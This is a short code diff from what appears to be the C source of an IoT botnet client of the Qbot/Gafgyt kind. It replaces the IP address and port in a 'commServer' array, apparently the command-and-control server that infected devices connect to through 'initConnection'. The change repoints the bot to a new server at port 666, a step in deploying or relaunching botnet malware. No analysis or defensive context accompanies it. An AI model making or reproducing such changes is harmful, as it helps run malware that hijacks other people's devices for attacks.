@@ -63,7 +63,7 @@
 
  unsigned char *commServer[] =
 {
-        "31.58.58.115:666"
+        "185.194.177.57:666"
 };
  
 int initConnection();
